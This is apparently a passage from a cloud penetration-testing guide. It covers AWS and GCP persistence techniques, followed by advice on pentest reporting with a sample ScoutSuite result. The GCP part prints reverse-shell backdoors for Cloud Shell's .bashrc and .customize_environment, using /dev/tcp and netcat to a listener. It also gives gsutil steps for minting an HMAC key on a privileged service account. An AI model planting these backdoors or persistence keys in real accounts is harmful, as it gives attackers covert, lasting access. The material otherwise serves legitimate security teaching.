Attackers can backdoor instances in several ways:

- **Traditional Rootkits**: Installing rootkits to maintain control over the instance.
- **SSH Keys**: Adding a new public SSH key to gain remote access.
- **User Data**: Modifying the instance's user data to include malicious scripts that execute upon startup.
- **Launch Configuration**: Backdooring the AMI or key pair used for instance launches.

**Scheduled Instances**

Attackers can use the feature to schedule instances to run at specific intervals (daily, weekly, or monthly). This can be leveraged to run a machine with high privileges at specific times, granting the attacker periodic access to the target environment.

There are also other ways of maintaining access other than through the EC2 instance:

- [AWS - API Gateway Persistence](https://cloud.hacktricks.xyz/pentesting-cloud/aws-security/aws-persistence/aws-api-gateway-persistence)
- [AWS - Cognito Persistence](https://cloud.hacktricks.xyz/pentesting-cloud/aws-security/aws-persistence/aws-cognito-persistence)
- [AWS - DynamoDB Persistence](https://cloud.hacktricks.xyz/pentesting-cloud/aws-security/aws-persistence/aws-dynamodb-persistence)
- [AWS - ECR Persistence](https://cloud.hacktricks.xyz/pentesting-cloud/aws-security/aws-persistence/aws-ecr-persistence)
- [AWS - ECS Persistence](https://cloud.hacktricks.xyz/pentesting-cloud/aws-security/aws-persistence/aws-ecs-persistence)
- [AWS - Elastic Beanstalk Persistence](https://cloud.hacktricks.xyz/pentesting-cloud/aws-security/aws-persistence/aws-elastic-beanstalk-persistence)
- [AWS - EFS Persistence](https://cloud.hacktricks.xyz/pentesting-cloud/aws-security/aws-persistence/aws-efs-persistence)
- [AWS - IAM Persistence](https://cloud.hacktricks.xyz/pentesting-cloud/aws-security/aws-persistence/aws-iam-persistence)
- [AWS - KMS Persistence](https://cloud.hacktricks.xyz/pentesting-cloud/aws-security/aws-persistence/aws-kms-persistence)
- [AWS - Lambda Persistence](https://cloud.hacktricks.xyz/pentesting-cloud/aws-security/aws-persistence/aws-lambda-persistence)
- [AWS - Lightsail Persistence](https://cloud.hacktricks.xyz/pentesting-cloud/aws-security/aws-persistence/aws-lightsail-persistence)
- [AWS - RDS Persistence](https://cloud.hacktricks.xyz/pentesting-cloud/aws-security/aws-persistence/aws-rds-persistence)
- [AWS - S3 Persistence](https://cloud.hacktricks.xyz/pentesting-cloud/aws-security/aws-persistence/aws-s3-persistence)
- [AWS - SNS Persistence](https://cloud.hacktricks.xyz/pentesting-cloud/aws-security/aws-persistence/aws-sns-persistence)
- [AWS - Secrets Manager Persistence](https://cloud.hacktricks.xyz/pentesting-cloud/aws-security/aws-persistence/aws-secrets-manager-persistence)
- [AWS - SQS Persistence](https://cloud.hacktricks.xyz/pentesting-cloud/aws-security/aws-persistence/aws-sqs-persistence)
- [AWS - SSM Perssitence](https://cloud.hacktricks.xyz/pentesting-cloud/aws-security/aws-persistence/aws-ssm-perssitence)
- [AWS - STS Persistence](https://cloud.hacktricks.xyz/pentesting-cloud/aws-security/aws-persistence/aws-sts-persistence)

#### GCP

**Persistent Shell Backdoor**

[**Google Cloud Shell**](https://cloud.google.com/shell/) provides command-line access to your cloud resources directly from your browser without any associated cost. While this platform is very convenient for users, it also offers potential exploitation opportunities for attackers.

Google Cloud Shell can be accessed from the **web console** or by executing `gcloud cloud-shell ssh`.

The console offers several advantages for attackers:

1. **Any Google user with access to Google Cloud** has access to a fully authenticated Cloud Shell instance, including service accounts that might have high privileges like organization owners.
2. This instance **retains its home directory for at least 120 days** of inactivity.
3. Organizations **cannot monitor** the activity within this instance, making it extremely difficult to detect malicious activities.

This means an attacker can place a backdoor in the user's home directory. As long as the user connects to Google Cloud Shell at least once every 120 days, the backdoor will persist, allowing the attacker to obtain a shell each time the script is executed. Here is an example command to insert into the `.bashrc` file to establish persistent access:

```shell
echo '(nohup /usr/bin/env -i /bin/bash 2>/dev/null -norc -noprofile >& /dev/tcp/'$CCSERVER'/443 0>&1 &)' >> $HOME/.bashrc
```

Additionally, another file in the home directory, **`.customize_environment`**, will be executed every time the user accesses **cloud shell**. By inserting a similar backdoor into this file, persistence can be maintained as long as the user frequently uses the cloud shell:

```shell
#!/bin/sh
apt-get install netcat -y
nc <LISTENER-ADDR> 443 -e /bin/bash
```

**Storage Persistence**

You can also persist in the storage part of Google Cloud Platform (GCP), by creating an HMAC key to maintain persistence on a storage bucket.

<Note type="tip" title="What is a HMAC key ?">
A **HMAC (Hash-based Message Authentication Code) key** is a specific type of key used in cryptography to ensure the integrity and authenticity of a message. It combines a cryptographic hash function (like SHA-256) with a secret key. Here's a simple breakdown of how it works:

1. **Message Authentication**: The HMAC process generates a code that verifies the message's integrity and authenticity. When a message is sent, the sender uses the secret key and the hash function to create an HMAC. The recipient, who also knows the secret key, can compute the HMAC on their side and compare it to the one sent. If they match, it confirms that the message hasn't been altered and is from the authentic sender.
2. **Integrity Check**: It ensures that the message has not been modified during transit. If even a single bit of the message is altered, the computed HMAC will change, indicating tampering.
3. **Combining Hash Function and Secret Key**: The secret key is a critical component. Without it, the HMAC cannot be correctly generated or verified. This secret key should be known only to the communicating parties.

In the context of cloud services like AWS S3 or Google Cloud Storage, HMAC keys are often used for secure access and interoperability between different cloud environments. An attacker obtaining an HMAC key can potentially gain unauthorized access or elevate their privileges within the cloud storage system.

</Note>

The "interoperability" feature of Cloud Storage, designed for **cross-cloud interactions** like with AWS S3, allows the **creation of HMAC keys for service accounts and users**. An attacker can exploit this by **generating an HMAC key for a highly privileged service account**, enabling them to **gain elevated privileges within Cloud Storage**.

For HMAC keys tied to a user, although they can only be retrieved through the web console, the access keys and secret keys remain **permanently accessible**, allowing for potential continuous access to storage. However, for HMAC keys tied to a service account, while these keys can be accessed through the API, their access keys and secret keys cannot be retrieved after creation, adding a layer of complexity for maintaining continuous access.

```
# Create key
gsutil hmac create <sa-email>

# Configure gsutil to use it
gcloud config set pass_credentials_to_gsutil false
gsutil config -a

# Use it
gsutil ls gs://[BUCKET_NAME]

# Restore
gcloud config set pass_credentials_to_gsutil true
```

You can also find another exploit script for this method [here](https://github.com/RhinoSecurityLabs/GCP-IAM-Privilege-Escalation/blob/master/ExploitScripts/storage.hmacKeys.create.py).

Like AWS, there are also many other ways to maintain access on a GCP platform:

- [GCP - API Keys Persistence](https://cloud.hacktricks.xyz/pentesting-cloud/gcp-security/gcp-persistence/gcp-api-keys-persistence)
- [GCP - App Engine Persistence](https://cloud.hacktricks.xyz/pentesting-cloud/gcp-security/gcp-persistence/gcp-app-engine-persistence)
- [GCP - Artifact Registry Persistence](https://cloud.hacktricks.xyz/pentesting-cloud/gcp-security/gcp-persistence/gcp-artifact-registry-persistence)
- [GCP - BigQuery Persistence](https://cloud.hacktricks.xyz/pentesting-cloud/gcp-security/gcp-persistence/gcp-bigquery-persistence)
- [GCP - Cloud Functions Persistence](https://cloud.hacktricks.xyz/pentesting-cloud/gcp-security/gcp-persistence/gcp-cloud-functions-persistence)
- [GCP - Cloud Run Persistence](https://cloud.hacktricks.xyz/pentesting-cloud/gcp-security/gcp-persistence/gcp-cloud-run-persistence)
- [GCP - Cloud SQL Persistence](https://cloud.hacktricks.xyz/pentesting-cloud/gcp-security/gcp-persistence/gcp-cloud-sql-persistence)
- [GCP - Compute Persistence](https://cloud.hacktricks.xyz/pentesting-cloud/gcp-security/gcp-persistence/gcp-compute-persistence)
- [GCP - Dataflow Persistence](https://cloud.hacktricks.xyz/pentesting-cloud/gcp-security/gcp-persistence/gcp-dataflow-persistence)
- [GCP - Filestore Persistence](https://cloud.hacktricks.xyz/pentesting-cloud/gcp-security/gcp-persistence/gcp-filestore-persistence)
- [GCP - Logging Persistence](https://cloud.hacktricks.xyz/pentesting-cloud/gcp-security/gcp-persistence/gcp-logging-persistence)
- [GCP - Non-svc Persistance](https://cloud.hacktricks.xyz/pentesting-cloud/gcp-security/gcp-persistence/gcp-non-svc-persistance)
- [GCP - Secret Manager Persistence](https://cloud.hacktricks.xyz/pentesting-cloud/gcp-security/gcp-persistence/gcp-secret-manager-persistence)

### Analyse and Report

As you embark on the journey of conducting cloud penetration tests, one of the most critical aspects of your role will be delivering clear and insightful reports to your clients. These reports serve not only to document findings but also to guide organizations in securing their cloud environments effectively.

#### Interpreting Results

Interpreting the results of a penetration test involves translating technical discoveries into meaningful insights. Your ability to communicate effectively is paramount. Break down complex technical details into straightforward language that all stakeholders can understand. Highlight the potential business impact of vulnerabilities, providing context on how they could affect day-to-day operations and compromise data security within the client's specific cloud setup.

#### Prioritizing Vulnerabilities

You should also prioritize vulnerabilities to help organizations address security risks efficiently. Use frameworks such as CVSS to categorize vulnerabilities based on severity, exploitability, and potential impact. This approach allows you to focus on addressing high-risk vulnerabilities first, which pose the greatest threat to the organization. Guide clients on developing a phased approach to remediation, distinguishing between immediate fixes and longer-term security enhancements.

#### Writing the Report

Crafting a compelling pentest report requires clarity and actionable insights. Start with a concise executive summary that outlines key findings and their implications for the client's security posture. Dive into detailed insights for each vulnerability, including how they were discovered, their potential consequences, and step-by-step guidance on reproducing them. Provide clear, practical recommendations for remediation, emphasizing specific configuration changes and best practices tailored to improve cloud security.

#### Final Considerations

To conclude, deliver your report with professionalism and an emphasis on continuous improvement. Ensure the report is clear and accessible to stakeholders with varying levels of technical expertise. It's important to encourage collaboration between your team and the client's IT and security personnel to ensure alignment and effective implementation of remediation measures. If any configurations or settings were modified during the pentest, make sure to inform the client promptly to maintain transparency and trust. Beyond remediation, recommend ongoing security practices, such as regular pentesting, to help the client maintain a proactive stance against evolving cyber threats.

#### Example of a ScoutSuite Report

To provide a clear and practical illustration of how vulnerabilities are identified and reported, the following example demonstrates a typical output from a ScoutSuite scan. This example highlights various services within a cloud environment and their associated vulnerabilities, helping to pinpoint areas that require immediate attention and remediation.

```
+------------------------+--------------------+
|        Service         |  Vulnerabilities   |
+------------------------+--------------------+
| IAM                    |         12         |
| EC2                    |         8          |
| S3                     |         5          |
| RDS                    |         3          |
| CloudTrail             |         2          |
+------------------------+--------------------+

IAM Vulnerabilities:
- IAM password policy does not require uppercase letters
- IAM password policy does not require numbers
- IAM users with password logins but no MFA
- IAM policies allowing full "*:*" administrative privileges

EC2 Vulnerabilities:
- Security groups with inbound rules allowing access from '0.0.0.0/0'
- Instances with public IP addresses
- Unencrypted EBS volumes

S3 Vulnerabilities:
- Buckets with public read access
- Buckets without versioning enabled
- Buckets without server-side encryption
```

Nevertheless, the final objective will be to produce a clean, professional report using this information. So this is what it might look like:

<Note type="unknown">

#### Vulnerability: S3 Buckets with Public Read Access

**Severity: High**

**Description:**

Several S3 buckets were identified as having public read access enabled. This configuration allows any user on the Internet to read the contents of these buckets, which could lead to unauthorized disclosure of sensitive data.

**Potential Impact:**

- Exposure of confidential data
- Non-compliance with regulatory requirements
- Damage to the company's reputation

**Detection Method:**

This vulnerability was detected using the ScoutSuite tool to analyze the configuration of S3 buckets.

**Affected Buckets:**

- `company-data-backup`
- `customer-records-2023`
- `marketing-assets`

**Recommendations:**

1. Immediately disable public access for all affected buckets.
2. Audit the contents of the buckets to identify any potentially exposed sensitive data.
3. Implement a least privilege policy for access to S3 buckets.
4. Configure server-side encryption for all buckets to protect data at rest.
5. Set up continuous monitoring of S3 security configurations to detect any unauthorized changes.

**Remediation Steps:**

1. Access the AWS S3 console.
2. Select each affected bucket.
3. In the "Permissions" tab, click on "Edit" in the "Block public access" section.
4. Check all boxes to block public access.
5. Save the changes.
6. Review and adjust bucket policies and Access Control Lists (ACLs) as necessary.

**Validation:**

After applying the remediation steps, conduct a follow-up scan with ScoutSuite to confirm that public access has been appropriately restricted for all affected buckets.

</Note>

## Resources

- [HTB Introduction to Pentest Cloud](https://www.hackthebox.com/blog/intro-cloud-pentesting)
- [GUIDEPOINT What is Cloud Pentesting ?](https://www.guidepointsecurity.com/education-center/cloud-penetration-testing/)
- [ASTRA Complete Guide](https://www.getastra.com/blog/security-audit/cloud-penetration-testing/)
- [AWS Penetration Testing Report](https://www.getastra.com/blog/security-audit/aws-penetration-testing-report/)
